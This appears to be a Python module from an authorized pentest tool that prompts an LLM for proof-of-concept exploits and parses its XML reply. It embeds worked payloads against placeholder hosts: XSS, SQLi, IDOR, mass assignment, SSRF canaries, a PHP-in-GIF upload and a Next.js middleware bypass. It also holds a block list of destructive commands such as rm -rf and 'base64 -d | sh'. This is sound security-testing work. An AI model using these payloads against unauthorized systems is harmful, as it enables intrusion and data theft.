"""PoC generation prompt + parser (VERIFY-03).

This module wires the LLM-facing half of Plan 03-04. The sandbox half
(`sentinel.agent.poc.sandbox`) does NOT call an LLM — it merely executes
the structured PoC that the agent produced. The bridge between the two is:

    finding -> render_poc_prompt(finding) -> [LLM] -> response text
        -> parse_poc_block(response) -> ParsedPoc -> execute_poc(...)

Why XML, not JSON
-----------------

The agent emits multi-line commands containing quotes, backslashes, and
shell special characters. JSON-escaping a multi-line shell one-liner with
embedded single + double quotes is fragile and the model frequently emits
malformed JSON for that shape. XML's "literal-between-tags" semantics
avoid the escaping cliff: the model writes the command verbatim between
`<command>` and `</command>` and we extract it with a single regex.

Output contract (the model must emit exactly this shape)
--------------------------------------------------------

    <poc>
    <language>shell | python | playwright | sqlmap</language>
    <command>...the runnable command...</command>
    <expected_output_regex>...what the sandbox looks for in stdout...</expected_output_regex>
    <rationale>...one paragraph explaining what the PoC proves...</rationale>
    </poc>

Anything else returns None from `parse_poc_block` so the sandbox treats
the finding as `pending` and the operator manually resubmits the prompt
or moves on.

Cross-plan note
---------------

The prompt explicitly warns the model away from the destructive verbs the
Plan 03-03 classifier flags (DROP TABLE, rm -rf, pickle.loads, yaml.unsafe_load,
etc.) so the model produces safe PoCs first-try. If the model emits a
destructive PoC anyway, the sandbox's first-layer defense is to short-circuit
via `classify_destructive`; this prompt is a soft prior, not a hard guard.
"""

from __future__ import annotations

import logging
import re
import textwrap
from dataclasses import dataclass
from typing import Optional

from sentinel.core.findings import Finding


log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------


# The four languages the sandbox knows how to dispatch. Adding a fifth
# requires both (a) extending this tuple AND (b) wiring the sandbox's
# `_build_subprocess_argv` to handle it. Out-of-set values are rejected
# at parse time so a malformed model response never reaches the sandbox.
ACCEPTED_LANGUAGES: tuple[str, ...] = ("shell", "python", "playwright", "sqlmap")


# Soft token-budget guardrail. The agent loop typically allows ~16k tokens
# of system+user prompt before the model starts losing instructions at the
# tail. We trim class-examples first (the bulk of the prompt) and never
# trim the schema / destructive-verb-warning section.
MAX_PROMPT_LENGTH = 16_000


# Destructive verbs the model MUST NOT emit. Mirrors the *names* of the
# Plan 03-03 `DESTRUCTIVE_PATTERNS` (sentinel/agent/poc/classifier.py)
# so the prompt's warning section is in sync with the classifier's
# enforcement. Keep this list aligned with that registry.
DESTRUCTIVE_VERBS_WARNING: tuple[str, ...] = (
    "DROP TABLE",
    "DROP DATABASE",
    "TRUNCATE",
    "DELETE FROM (without WHERE)",
    "UPDATE ... SET password",
    "rm -rf",
    "mkfs",
    "dd if=... of=/dev/...",
    "chmod 777",
    "fork bomb :(){:|:&};:",
    "kill -9 1",
    "sqlmap --drop|--purge|--destroy",
    "base64 -d | sh",
    "os.remove('/etc/...')",
    "shutil.rmtree('/...')",
    "eval(open(...).read())",
    "pickle.loads",
    "yaml.unsafe_load",
    "yaml.load() without SafeLoader",
)


# ---------------------------------------------------------------------------
# Data shapes
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class ParsedPoc:
    """Structured PoC the sandbox knows how to execute.

    All four fields are non-empty by construction (the parser rejects
    blanks). `command` may be multi-line; `expected_output_regex` is a
    compileable Python `re` pattern; `language` is guaranteed to be one of
    `ACCEPTED_LANGUAGES`.
    """

    command: str
    language: str
    expected_output_regex: str
    rationale: str


# ---------------------------------------------------------------------------
# Reference example corpus
# ---------------------------------------------------------------------------
#
# The model sees the entries for its detected vuln class. These are
# deliberately non-destructive — every entry round-trips through
# `classify_destructive` as SAFE (tests/test_poc_prompt.py:
# `test_poc_examples_no_destructive_payloads` pins this).
#
# Each entry is a dict with the same four keys as ParsedPoc so the model
# can pattern-match the structure visually.


POC_EXAMPLES: dict[str, list[dict[str, str]]] = {
    # ----- XSS (reflected + DOM, 3 examples) ------------------------------
    "xss": [
        {
            "language": "shell",
            "command": (
                "curl -s 'http://target.example.com/search?q=%3Cscript%3Ealert(1)"
                "%3C%2Fscript%3E'"
            ),
            "expected_output_regex": "<script>alert\\(1\\)</script>",
            "rationale": (
                "Reflected XSS: the search query is URL-encoded into the request "
                "and we expect the server to echo it back unescaped in the HTML "
                "body. Match on the literal script tag in the response."
            ),
        },
        {
            "language": "python",
            "command": (
                "import requests\n"
                "r = requests.get('http://target.example.com/profile', "
                "params={'name': '\"><script>alert(1)</script>'})\n"
                "print(r.text)"
            ),
            "expected_output_regex": "<script>alert\\(1\\)</script>",
            "rationale": (
                "Attribute-context reflected XSS: break out of the value attribute "
                "with `\">` then inject a script tag. Python requests is easier than "
                "shell quoting for this payload shape."
            ),
        },
        {
            "language": "playwright",
            "command": (
                "from playwright.sync_api import sync_playwright\n"
                "with sync_playwright() as p:\n"
                "    browser = p.chromium.launch()\n"
                "    page = browser.new_page()\n"
                "    msgs = []\n"
                "    page.on('dialog', lambda d: msgs.append(d.message) or d.dismiss())\n"
                "    page.goto('http://target.example.com/#%3Cscript%3Ealert(1)%3C/script%3E')\n"
                "    page.wait_for_timeout(2000)\n"
                "    page.screenshot(path='screenshot.png')\n"
                "    print('DIALOGS:', msgs)\n"
                "    browser.close()"
            ),
            "expected_output_regex": r"DIALOGS:\s*\['?1'?\]",
            "rationale": (
                "DOM XSS via the URL fragment: we register a dialog handler so "
                "alert(1) is captured rather than blocking. A screenshot is "
                "written to screenshot.png as visual evidence."
            ),
        },
    ],
    # ----- SQLi (boolean-blind + UNION + error-based, 3 examples) ---------
    "sqli": [
        {
            "language": "shell",
            "command": (
                "curl -s -o /dev/null -w '%{http_code} %{size_download}' "
                "'http://target.example.com/?id=1%20AND%201%3D1' && "
                "echo ' | ' && "
                "curl -s -o /dev/null -w '%{http_code} %{size_download}' "
                "'http://target.example.com/?id=1%20AND%201%3D2'"
            ),
            "expected_output_regex": r"\d{3}\s+\d+\s+\|\s+\d{3}\s+\d+",
            "rationale": (
                "Boolean-blind SQLi: AND 1=1 should return the normal response; "
                "AND 1=2 should differ (smaller body or different code) if the "
                "parameter flows into the SQL query. The PoC just emits both "
                "size+code pairs for the verifier to diff."
            ),
        },
        {
            "language": "shell",
            "command": (
                "curl -s 'http://target.example.com/?id=1%20UNION%20SELECT%20"
                "NULL%2Cversion()%2C3--%20-'"
            ),
            "expected_output_regex": r"PostgreSQL|MySQL|MariaDB|SQLite|Oracle",
            "rationale": (
                "UNION-based SQLi: 3-column union with version() in slot 2. The "
                "expected_output_regex matches the canonical DB-engine banner so "
                "the verifier confirms exfiltration shape."
            ),
        },
        {
            "language": "sqlmap",
            "command": (
                "sqlmap -u 'http://target.example.com/?id=1' --batch "
                "--level=1 --risk=1 --technique=B --flush-session"
            ),
            "expected_output_regex": (
                r"parameter.*is vulnerable|is\s+(?:GET|POST)\s+parameter"
            ),
            "rationale": (
                "Read-only sqlmap probe: --level=1 --risk=1 --technique=B is the "
                "least-invasive boolean-blind detection mode. No destructive flags "
                "(--drop / --purge / --delete) — those are upstream-classified."
            ),
        },
    ],
    # ----- IDOR (sequential ID swap, 3 examples) --------------------------
    "idor": [
        {
            "language": "shell",
            "command": (
                "curl -s -H 'Authorization: Bearer $TOKEN_USER1' "
                "'http://target.example.com/api/users/2'"
            ),
            "expected_output_regex": r'"email"\s*:\s*"[^"]+@',
            "rationale": (
                "Classic IDOR: user1's token requests user2's record. If the "
                "response contains user2's email field, per-user authorization "
                "is missing. (Operator: replace $TOKEN_USER1 with a real test "
                "account token via scope.auth_credentials.)"
            ),
        },
        {
            "language": "shell",
            "command": (
                "curl -s 'http://target.example.com/orders/100' && "
                "echo '|' && "
                "curl -s 'http://target.example.com/orders/101'"
            ),
            "expected_output_regex": r"customer_id|order_total",
            "rationale": (
                "Sequential-ID IDOR on /orders/{id}: fetch two consecutive IDs and "
                "verify both return order detail without auth. The expected regex "
                "matches a representative field name from the JSON body."
            ),
        },
        {
            "language": "python",
            "command": (
                "import requests\n"
                "ok = []\n"
                "for uid in (1, 2, 3, 100):\n"
                "    r = requests.get(f'http://target.example.com/api/users/{uid}')\n"
                "    ok.append((uid, r.status_code))\n"
                "print(ok)"
            ),
            "expected_output_regex": r"\(\d+,\s*200\).*\(\d+,\s*200\)",
            "rationale": (
                "Range-walk IDOR: hit /api/users/{id} for several IDs without "
                "auth. If two or more return 200, per-user authorization is "
                "absent at the endpoint."
            ),
        },
    ],
    # ----- Auth bypass (route-level + role + verb confusion, 3 examples) --
    "auth": [
        {
            "language": "shell",
            "command": (
                "curl -s -o /dev/null -w '%{http_code}\\n' "
                "'http://target.example.com/admin'"
            ),
            "expected_output_regex": r"^200$",
            "rationale": (
                "Route-level auth bypass: hit /admin without any auth header. A "
                "200 response (rather than 401/403/redirect) indicates the admin "
                "route is publicly exposed."
            ),
        },
        {
            "language": "shell",
            "command": (
                "curl -s -X PUT 'http://target.example.com/api/users/1' "
                "-H 'Content-Type: application/json' "
                "-d '{\"role\":\"admin\"}'"
            ),
            "expected_output_regex": r'"role"\s*:\s*"admin"|"updated"\s*:\s*true',
            "rationale": (
                "Mass-assignment privilege escalation: send a role field in the "
                "user-profile PUT. If the API echoes role=admin or claims update "
                "success, the field isn't on the input allow-list."
            ),
        },
        {
            "language": "shell",
            "command": (
                "curl -s -X DELETE 'http://target.example.com/api/posts/1' "
                "-H 'X-HTTP-Method-Override: GET'"
            ),
            "expected_output_regex": r"^(200|204)$|deleted",
            "rationale": (
                "HTTP verb tampering via X-HTTP-Method-Override: some routers honor "
                "the header and dispatch as the overridden verb, bypassing the GET "
                "auth middleware that doesn't apply to DELETE."
            ),
        },
    ],
    # ----- SSRF (in-scope OAST + cloud-metadata canary, 3 examples) -------
    "ssrf": [
        {
            "language": "shell",
            "command": (
                "curl -s 'http://target.example.com/fetch?url="
                "http://oast.example.com/ssrf-canary'"
            ),
            "expected_output_regex": r"ok|fetched|status",
            "rationale": (
                "Classic SSRF: pass an in-scope OAST callback URL as the fetch "
                "target. The agent confirms the callback hit out-of-band; the "
                "regex match is just on the server's response that it accepted "
                "the request."
            ),
        },
        {
            "language": "shell",
            "command": (
                "curl -s 'http://target.example.com/fetch?url="
                "http://target.example.com/internal/healthcheck'"
            ),
            "expected_output_regex": r"healthy|ok|status\s*:\s*200",
            "rationale": (
                "Same-origin SSRF: pivot the fetch-URL to a path that an external "
                "client can't reach. If the body contains the internal-only "
                "healthcheck response, the proxy bridges external -> internal."
            ),
        },
        {
            "language": "python",
            "command": (
                "import requests\n"
                "r = requests.get('http://target.example.com/fetch', "
                "params={'url': 'http://oast.example.com/ssrf-py-canary'})\n"
                "print('STATUS', r.status_code)\n"
                "print(r.text[:512])"
            ),
            "expected_output_regex": r"STATUS\s+(200|201|202)",
            "rationale": (
                "Python equivalent of the OAST canary probe. Easier to programmatic-"
                "ally vary the canary URL across multiple findings."
            ),
        },
    ],
    # ----- CSRF + file_upload (1-2 entries each — secondary coverage) ----
    "csrf": [
        {
            "language": "shell",
            "command": (
                "curl -s -X POST 'http://target.example.com/api/profile' "
                "-H 'Content-Type: application/x-www-form-urlencoded' "
                "-d 'email=attacker%40evil.example' "
                "--cookie 'session=$VALID_SESSION'"
            ),
            "expected_output_regex": r'"updated"\s*:\s*true|profile.*saved',
            "rationale": (
                "CSRF: state-changing POST with cookie but no CSRF token or Origin "
                "validation. If the response indicates success, the endpoint is "
                "exploitable from any third-party origin."
            ),
        },
    ],
    "file_upload": [
        {
            "language": "shell",
            "command": (
                "echo 'GIF89a<?php echo file_get_contents(\"/etc/hostname\"); ?>' "
                "> /tmp/poc.php.gif && "
                "curl -s -X POST 'http://target.example.com/upload' "
                "-F 'avatar=@/tmp/poc.php.gif'"
            ),
            "expected_output_regex": r'"url"\s*:\s*"|uploaded\s*to',
            "rationale": (
                "MIME-confusion upload: file starts with GIF magic bytes (so an "
                "image-mime check passes) but is named *.php.gif (so some "
                "servers serve it as PHP). The expected_output_regex matches a "
                "stored-file URL field; the agent then fetches the URL to "
                "confirm execution."
            ),
        },
    ],
    # ----- Subdomain takeover (dangling-CNAME signature, 1 example) -------
    "takeover": [
        {
            "language": "shell",
            "command": (
                "dig +short CNAME staging.target.example.com && "
                "curl -s -H 'Host: staging.target.example.com' "
                "https://staging.target.example.com/"
            ),
            "expected_output_regex": (
                r"NoSuchBucket|There isn't a GitHub Pages site here|"
                r"no-such-app\.herokuapp|project not found|"
                r"do not have an app deployed"
            ),
            "rationale": (
                "Dangling-CNAME takeover PoC: resolve the subdomain's CNAME (it "
                "should point at an unclaimed SaaS host) then fetch the apex and "
                "match the provider's 'not found / unclaimed' signature. A "
                "signature match proves the resource is registerable by an "
                "attacker. Detection only — do NOT actually claim the resource."
            ),
        },
    ],
    # ----- Open redirect (Location-header confirmation, 2 examples) -------
    "redirect": [
        {
            "language": "shell",
            "command": (
                "curl -s -o /dev/null -D - "
                "'http://target.example.com/login?next=https://attacker-test.example' "
                "| grep -i '^location:'"
            ),
            "expected_output_regex": r"(?i)^location:\s*https?://attacker-test\.example",
            "rationale": (
                "Open redirect PoC: send an attacker host in the ?next= param and "
                "match the response Location header pointing at the attacker host. "
                "The match on Location (not body) is what proves the redirect is "
                "unvalidated; uses a benign attacker-test.example sentinel host."
            ),
        },
        {
            "language": "shell",
            "command": (
                "curl -s -o /dev/null -D - "
                "'http://target.example.com/r?url=//attacker-test.example' "
                "| grep -i '^location:'"
            ),
            "expected_output_regex": r"(?i)^location:\s*(https?:)?//attacker-test\.example",
            "rationale": (
                "Protocol-relative bypass: when the obvious https:// payload is "
                "filtered, // is often missed and the browser still navigates "
                "cross-origin. Match the Location header carrying the // host."
            ),
        },
    ],
    # ----- GraphQL (introspection + alias-BOLA, 2 examples) ---------------
    "graphql": [
        {
            "language": "shell",
            "command": (
                "curl -s 'http://target.example.com/graphql' "
                "-H 'Content-Type: application/json' "
                "-d '{\"query\":\"{__schema{queryType{name}}}\"}'"
            ),
            "expected_output_regex": r'"queryType"\s*:\s*\{\s*"name"',
            "rationale": (
                "Introspection-enabled PoC: a minimal __schema query. If the "
                "queryType name comes back, introspection is on in production and "
                "the full attack map is exposed. Read-only, single small query "
                "(no depth/breadth bomb)."
            ),
        },
        {
            "language": "shell",
            "command": (
                "curl -s 'http://target.example.com/graphql' "
                "-H 'Content-Type: application/json' "
                "-d '{\"query\":\"{a:user(id:1){email} b:user(id:2){email} "
                "c:user(id:3){email}}\"}'"
            ),
            "expected_output_regex": r'"a"\s*:.*"b"\s*:.*"c"\s*:',
            "rationale": (
                "Alias-based BOLA PoC: three aliased user lookups in ONE request. "
                "Resolvers that authz at the operation level (not per-resolver) "
                "return all three users' emails, proving per-object authz is "
                "missing. Three aliases is a demonstration, not an exhaustion "
                "attack."
            ),
        },
    ],
    # ----- Race / TOCTOU (burst + read-back, 1 example) -------------------
    "race": [
        {
            "language": "python",
            "command": (
                "import concurrent.futures, requests\n"
                "URL = 'http://target.example.com/api/promo/claim'\n"
                "H = {'Authorization': 'Bearer $TOKEN', "
                "'Content-Type': 'application/json'}\n"
                "def claim():\n"
                "    r = requests.post(URL, headers=H, json={'code': 'WELCOME10'})\n"
                "    return r.status_code\n"
                "with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:\n"
                "    codes = list(ex.map(lambda _: claim(), range(20)))\n"
                "succ = sum(1 for c in codes if c == 200)\n"
                "bal = requests.get('http://target.example.com/api/balance', "
                "headers=H).json()\n"
                "print('SUCCESS_2XX', succ, 'BALANCE', bal)"
            ),
            "expected_output_regex": r"SUCCESS_2XX\s+([2-9]|\d{2,})\b",
            "rationale": (
                "TOCTOU race PoC: fire 20 parallel single-use coupon claims, then "
                "READ BACK the balance. >=2 successful 2xx (the regex) plus a "
                "balance that moved N>1 times proves the check/mutate pair isn't "
                "atomic. The read-back is mandatory — N×2xx without state movement "
                "is not a confirmed race. (Operator: prefer the in-pipeline "
                "race_request tool which honors scope.rate_limits for the burst.)"
            ),
        },
    ],
    # ----- Novel / zero-day (variant/control delta, 2 examples) -----------
    # The defining PoC shape for a logic/design bug: a VARIANT request and a
    # CONTROL request whose responses must DIFFER deterministically. No
    # signature — the regex matches the delta marker, and the rationale
    # carries the framework-design MECHANISM that makes the delta real.
    "novel": [
        {
            "language": "shell",
            "command": (
                "echo '--- CONTROL (no forged header) ---' && "
                "curl -s -o /dev/null -w '%{http_code}\\n' "
                "'http://target.example.com/admin/metrics' && "
                "echo '--- VARIANT (forged internal subrequest header) ---' && "
                "curl -s -o /dev/null -w '%{http_code}\\n' "
                "-H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' "
                "'http://target.example.com/admin/metrics'"
            ),
            "expected_output_regex": r"(?s)CONTROL.*?\b(401|403|307)\b.*?VARIANT.*?\b200\b",
            "rationale": (
                "Framework-inherent (Next.js x-middleware-subrequest bypass, "
                "CVE-2025-29927 shape): the CONTROL request to a middleware-gated "
                "route returns 401/403/307; the VARIANT forging the internal "
                "x-middleware-subrequest header returns 200. MECHANISM: Next.js "
                "skips middleware when it believes the request is an internal "
                "subrequest, and the edge doesn't strip the attacker-supplied "
                "header. The status DELTA between control and variant is the proof; "
                "a real read-back of admin data would upgrade it to live_confirmed."
            ),
        },
        {
            "language": "python",
            "command": (
                "import hashlib, requests\n"
                "# CONTROL: tenant header matches the token's tenant\n"
                "ctrl = requests.get('http://target.example.com/api/records', "
                "headers={'Authorization': 'Bearer $TOKEN_T1', "
                "'X-Tenant-Id': 'tenant-1'})\n"
                "# VARIANT: same token, but spoof a different tenant in the header\n"
                "var = requests.get('http://target.example.com/api/records', "
                "headers={'Authorization': 'Bearer $TOKEN_T1', "
                "'X-Tenant-Id': 'tenant-2'})\n"
                "ch = hashlib.sha256(ctrl.content).hexdigest()[:12]\n"
                "vh = hashlib.sha256(var.content).hexdigest()[:12]\n"
                "print('CONTROL_HASH', ch)\n"
                "print('VARIANT_HASH', vh)\n"
                "print('DELTA', 'YES' if ch != vh and var.status_code == 200 else 'NO')"
            ),
            "expected_output_regex": r"DELTA\s+YES",
            "rationale": (
                "Multi-tenant isolation (tenant-id SOURCE disagreement): the token "
                "scopes to tenant-1 but the app trusts the X-Tenant-Id HEADER for "
                "the data lookup. CONTROL (matching header) and VARIANT (spoofed "
                "tenant-2 header) produce DIFFERENT response hashes with the "
                "variant returning 200 tenant-2 data. MECHANISM: authorization "
                "reads tenant from the token while data access reads it from the "
                "header — two sources of truth. The variant!=control hash delta is "
                "the deterministic proof the verifier re-confirms."
            ),
        },
    ],
}


# B2 — the vuln class slug is `injection` (vuln_classes.py) but the historical
# POC_EXAMPLES key is `sqli`. Alias so a `vuln:injection` scanner field and
# CWE-89 both resolve to the SQLi worked examples without duplicating them.
POC_EXAMPLES["injection"] = POC_EXAMPLES["sqli"]


# Fallback when the finding's class is not in POC_EXAMPLES. Picks one
# example from each top-five class so the model still sees a varied
# reference corpus.
_FALLBACK_EXAMPLE_CLASSES: tuple[str, ...] = ("xss", "sqli", "idor", "auth", "ssrf")


# ---------------------------------------------------------------------------
# Class-shorthand derivation
# ---------------------------------------------------------------------------


# Map common CWE IDs onto our shorthand keys. Used when the finding's
# `scanner` field isn't a `vuln:<class>` slug but the CWE pins the class.
_CWE_TO_CLASS: dict[str, str] = {
    "CWE-79": "xss",
    "CWE-80": "xss",
    "CWE-89": "injection",   # SQLi — POC_EXAMPLES["injection"] aliases sqli (B3)
    "CWE-639": "idor",
    "CWE-284": "auth",
    "CWE-285": "auth",
    "CWE-287": "auth",
    "CWE-918": "ssrf",
    "CWE-352": "csrf",
    "CWE-434": "file_upload",
    # B3 — remap the Tier-1/2 + novel classes so a finding tagged only by CWE
    # (no vuln:<slug> scanner field) still selects the right example set.
    "CWE-1357": "takeover",   # subdomain takeover (dangling third-party CNAME)
    "CWE-601": "redirect",    # open redirect
    "CWE-942": "cors",        # permissive CORS
    "CWE-93": "crlf",         # CRLF / response splitting
    "CWE-345": "jwt_oauth",   # insufficient verification of data authenticity
    "CWE-362": "race",        # race condition / TOCTOU
    "CWE-840": "novel",       # business-logic / design-inherent (zero-day)
}


def _detect_vuln_class(finding: Finding) -> Optional[str]:
    """Derive a POC_EXAMPLES key from the finding.

    Heuristics (first match wins):
      1. `finding.scanner` starts with `vuln:` -> use the suffix.
      2. `finding.cwe` is in `_CWE_TO_CLASS`.
      3. Fall back to None (caller selects the multi-class fallback).
    """
    scanner = (finding.scanner or "").lower()
    if scanner.startswith("vuln:"):
        cls = scanner[len("vuln:"):].split(":")[0].strip()
        if cls in POC_EXAMPLES:
            return cls
    cwe = (finding.cwe or "").strip().upper()
    if cwe in _CWE_TO_CLASS:
        candidate = _CWE_TO_CLASS[cwe]
        if candidate in POC_EXAMPLES:
            return candidate
    return None


# ---------------------------------------------------------------------------
# Prompt rendering
# ---------------------------------------------------------------------------


def _render_example(entry: dict[str, str]) -> str:
    """Render one POC_EXAMPLES entry as an XML `<poc>` block."""
    return (
        "<poc>\n"
        f"<language>{entry['language']}</language>\n"
        f"<command>{entry['command']}</command>\n"
        f"<expected_output_regex>{entry['expected_output_regex']}</expected_output_regex>\n"
        f"<rationale>{entry['rationale']}</rationale>\n"
        "</poc>"
    )


def _select_examples(vuln_class: Optional[str]) -> list[dict[str, str]]:
    """Return the example list the prompt embeds.

    If `vuln_class` is set, return ALL entries for that class so the model
    sees ≥ 3 worked examples. Otherwise return one entry per top-five class
    as a multi-class fallback.
    """
    if vuln_class and vuln_class in POC_EXAMPLES:
        return list(POC_EXAMPLES[vuln_class])
    # Fallback: one entry per top-five class.
    out: list[dict[str, str]] = []
    for cls in _FALLBACK_EXAMPLE_CLASSES:
        entries = POC_EXAMPLES.get(cls) or []
        if entries:
            out.append(entries[0])
    return out


def _build_poc_sections(finding: Finding) -> tuple[str, str]:
    """Build the two halves of the PoC prompt:

      - ``system_prefix`` — CLASS-STABLE: role + accepted langs + schema +
        per-class examples + destructive-verb list. Byte-identical for every
        finding of the same vuln class, carrying NO per-finding data, so the
        SDK's automatic system-prompt caching charges it once and reads it at
        ~0.1x for the 2nd..Nth same-class finding in the verify-phase-03
        fan-out (the single biggest cost line — see cost analysis 2026-XX-XX).
      - ``finding_brief`` — PER-FINDING: the finding summary + scope note.
        Small, sent in the USER turn so it never breaks the cached prefix.

    Trimming for ``MAX_PROMPT_LENGTH`` drops the examples block first and never
    drops the schema or destructive-verb warning.
    """
    vuln_class = _detect_vuln_class(finding)
    examples = _select_examples(vuln_class)

    # --- Section 1: role + task statement ---
    role = textwrap.dedent(
        """\
        You are the Sentinel verifier. Generate a SINGLE proof-of-concept (PoC)
        for the security finding below. The PoC must be a runnable command (or
        short script) that demonstrates the bug end-to-end against the target.

        A separate execution sandbox will run your PoC inside a 60-second
        timeout, capture stdout/stderr, and match stdout against your provided
        regex. Your job is to make that match succeed on a vulnerable target
        and fail on a patched one.
        """
    ).strip()

    # --- Section 2: finding summary ---
    summary = textwrap.dedent(
        f"""\
        ## Finding

        - Title: {finding.title}
        - Target: {finding.target}
        - Location: {finding.location or '(not specified)'}
        - Severity: {finding.severity.value if hasattr(finding.severity, 'value') else finding.severity}
        - Scanner: {finding.scanner}
        - CWE: {finding.cwe or '(unknown)'}
        - Evidence state: {finding.evidence_state.value if hasattr(finding.evidence_state, 'value') else finding.evidence_state}
        - Description:
        {textwrap.indent(finding.description or '(no description)', '  ')}
        """
    ).strip()

    # --- Section 3: accepted languages ---
    lang_lines = "\n".join(
        f"  - {lang}: " + {
            "shell": "bash one-liner or short script (curl, dig, openssl, sqlmap, etc.). The sandbox runs `bash -e poc.sh`.",
            "python": "Python script. The sandbox runs `python poc.py` with the project venv.",
            "playwright": "Python script using playwright.sync_api. The sandbox runs `python poc.py`; capture a `screenshot.png` in the cwd as visual evidence.",
            "sqlmap": "sqlmap invocation in read-only / detection mode (no `--drop`, `--purge`, `--destroy`, `--delete` — the classifier short-circuits those).",
        }[lang]
        for lang in ACCEPTED_LANGUAGES
    )
    accepted = textwrap.dedent(
        f"""\
        ## Accepted languages

{lang_lines}
        """
    ).strip()

    # --- Section 4: required output shape (literal schema) ---
    schema = textwrap.dedent(
        """\
        ## Required output shape

        Your entire response MUST contain exactly ONE `<poc>` XML block in
        the following shape. Anything outside this block is ignored, but the
        block itself is parsed by literal regex extraction so the tag names
        must match exactly:

            <poc>
            <language>shell | python | playwright | sqlmap</language>
            <command>the runnable command, can be multi-line</command>
            <expected_output_regex>a Python `re` pattern the sandbox runs against stdout</expected_output_regex>
            <rationale>one paragraph: what the PoC proves and why the regex confirms it</rationale>
            </poc>

        Notes:
          - `language` value must be one of the four tokens listed above.
          - `expected_output_regex` must compile as Python `re` (the sandbox
            calls `re.search(..., re.MULTILINE)`). Escape backslashes as
            usual; the sandbox does not double-escape on your behalf.
          - `command` may span multiple lines; the sandbox writes it
            verbatim to `poc.sh` (or `poc.py` for python/playwright).
        """
    ).strip()

    # --- Section 5: class-specific (or fallback) worked examples ---
    detected_class = vuln_class or "(no class detected — multi-class reference set below)"
    example_blocks = "\n\n".join(_render_example(e) for e in examples)
    examples_section = textwrap.dedent(
        f"""\
        ## Reference examples ({detected_class})

        Use these as a template for the structure and tone, not for the
        literal URLs (those are placeholders). Pattern your PoC against the
        same shape:

        """
    ).rstrip() + "\n\n" + example_blocks

    # --- Section 5b: adversarial-validation doctrine (signal != PoC) ---
    # The PoC must prove the bug at the IMPACT layer, not just emit the raw
    # signal. doctrine_block(vuln_class) is class-stable (no per-finding data)
    # so it stays inside the cacheable system prefix. None → generic block.
    from sentinel.agent.pentest.adversarial_validation import doctrine_block
    doctrine = doctrine_block(vuln_class)

    # --- Section 6: destructive-verb rejection list ---
    verb_lines = "\n".join(f"  - {v}" for v in DESTRUCTIVE_VERBS_WARNING)
    destructive = textwrap.dedent(
        f"""\
        ## DO NOT emit destructive commands

        The execution sandbox classifies the following verbs/patterns as
        destructive and will short-circuit your PoC to `manual-required`
        WITHOUT executing it. That wastes a turn AND signals you to the
        operator as having produced unsafe output:

{verb_lines}

        Demonstrate the bug WITHOUT mutating client data. Boolean-blind
        differential probes, read-only enumeration, OAST callbacks, and
        screenshot capture are the preferred shapes.
        """
    ).strip()

    # --- Section 7: scope-gating reminder ---
    scope_note = textwrap.dedent(
        f"""\
        ## Scope

        Every URL in your PoC will be authorized via
        `Scope.authorize_url()` BEFORE the sandbox runs subprocess.run.
        Any URL outside the engagement scope refuses the entire PoC
        (`evidence_state=manual-required`). Use ONLY URLs whose host
        matches the target ({finding.target}) or another in-scope domain.
        Do not probe link-local IPs (169.254.169.254 / metadata services)
        unless the operator explicitly added them to scope.
        """
    ).strip()

    # Assemble. Cache-friendly order (2026-XX-XX): the CLASS-STABLE prefix
    # (role / accepted / schema / examples / destructive) comes FIRST and is
    # byte-identical for every finding of the same vuln class, so the SDK's
    # automatic system-prompt caching can charge it once and read it at ~0.1x
    # for the 2nd..Nth same-class finding in the verify-phase-03 fan-out (the
    # single biggest line item — see TRANSFER/cost analysis). The PER-FINDING
    # tail (summary / scope) goes LAST so it never breaks the cacheable prefix.
    # `_poc_prompt_cache_prefix(vuln_class)` reproduces this exact prefix for
    # tests/diagnostics. Trim still drops the examples block first if we exceed
    # MAX_PROMPT_LENGTH — schema + destructive-verb list are load-bearing.
    system_prefix = "\n\n".join([role, accepted, schema, examples_section, destructive, doctrine])
    finding_brief = "\n\n".join([summary, scope_note])
    if len(system_prefix) + len(finding_brief) + 2 > MAX_PROMPT_LENGTH:
        log.warning(
            "render_poc_prompt: trimming examples (prompt length %d > %d)",
            len(system_prefix) + len(finding_brief), MAX_PROMPT_LENGTH,
        )
        # Drop examples first; keep schema + destructive list + doctrine
        # (all load-bearing for a safe, impact-proving PoC).
        system_prefix = "\n\n".join([role, accepted, schema, destructive, doctrine])
    return system_prefix, finding_brief


def render_poc_system_prefix(finding: Finding) -> str:
    """Class-stable system prompt (see ``_build_poc_sections``). Send this as
    the agent's ``system_prompt`` so the SDK caches it across the per-finding
    verify fan-out. Carries no per-finding data."""
    return _build_poc_sections(finding)[0]


def render_poc_finding_brief(finding: Finding) -> str:
    """Per-finding brief (summary + scope). Send this in the USER turn so the
    cached system prefix stays byte-identical for the vuln class."""
    return _build_poc_sections(finding)[1]


def render_poc_prompt(finding: Finding) -> str:
    """Full single-string prompt (system prefix + finding brief joined).

    Retained for backward-compat and tests. The verify-phase-03 loop now sends
    the two halves separately (``render_poc_system_prefix`` as system,
    ``render_poc_finding_brief`` in the user turn) so the class-stable prefix
    is cacheable; this convenience joiner keeps every other caller working.
    """
    system_prefix, finding_brief = _build_poc_sections(finding)
    return system_prefix + "\n\n" + finding_brief


# ---------------------------------------------------------------------------
# Parser
# ---------------------------------------------------------------------------


# Strip optional leading markdown code fence (```xml / ``` / ~~~xml etc.)
# and trailing fence. The model frequently wraps its <poc> block in a
# fence; we tolerate that without forcing it.
_FENCE_LEADING_RE = re.compile(r"^[`~]{3,}\s*\w*\s*\n", re.MULTILINE)
_FENCE_TRAILING_RE = re.compile(r"\n[`~]{3,}\s*$", re.MULTILINE)

_POC_BLOCK_RE = re.compile(r"<poc>\s*(.*?)\s*</poc>", re.DOTALL | re.IGNORECASE)
_LANGUAGE_RE = re.compile(r"<language>\s*(.*?)\s*</language>", re.DOTALL | re.IGNORECASE)
_COMMAND_RE = re.compile(r"<command>\s*(.*?)\s*</command>", re.DOTALL | re.IGNORECASE)
_EXPECTED_RE = re.compile(
    r"<expected_output_regex>\s*(.*?)\s*</expected_output_regex>",
    re.DOTALL | re.IGNORECASE,
)
_RATIONALE_RE = re.compile(r"<rationale>\s*(.*?)\s*</rationale>", re.DOTALL | re.IGNORECASE)


def parse_poc_block(response: Optional[str]) -> Optional[ParsedPoc]:
    """Extract the first `<poc>` block from a model response.

    Returns None on any of:
      - response is empty / None
      - no `<poc>...</poc>` block found
